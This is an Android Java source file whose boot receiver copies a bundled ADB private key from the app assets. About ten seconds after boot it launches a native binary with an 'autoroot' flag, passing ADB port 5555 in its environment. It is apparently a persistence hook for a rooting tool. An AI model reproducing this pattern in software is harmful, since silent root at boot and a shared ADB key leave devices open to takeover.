package com.ghostlock.anchor;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;

public class BootReceiver extends BroadcastReceiver {
    private static final String TAG = "GhostLockAnchor";

    @Override
    public void onReceive(Context ctx, Intent intent) {
        Log.i(TAG, "boot broadcast received");
        try {
            File dir = ctx.getFilesDir();

            // stage the adb private key from assets into filesDir (0600)
            File key = new File(dir, "adbkey");
            if (!key.exists()) {
                InputStream in = ctx.getAssets().open("adbkey");
                FileOutputStream out = new FileOutputStream(key);
                byte[] b = new byte[4096];
                int n;
                while ((n = in.read(b)) > 0) out.write(b, 0, n);
                in.close();
                out.close();
                key.setReadable(false, false);
                key.setReadable(true, true);
                key.setWritable(false, false);
                key.setWritable(true, true);
            }

            String bin = ctx.getApplicationInfo().nativeLibraryDir + "/libminiboot.so";
            File log = new File(dir, "autoroot.log");

            // settle briefly after boot, then run the autoroot cycle
            String[] cmd = {"/system/bin/sh", "-c",
                "(sleep 10; exec " + bin + " --autoroot) >> " + log.getPath() + " 2>&1"};
            String[] env = {
                "PATH=/system/bin:/system/xbin",
                "MINIADB_KEY=" + key.getPath(),
                "MINIADB_PORT=5555"
            };
            Runtime.getRuntime().exec(cmd, env);
            Log.i(TAG, "autoroot spawned");
        } catch (Throwable t) {
            Log.e(TAG, "autoroot failed", t);
        }
    }
}
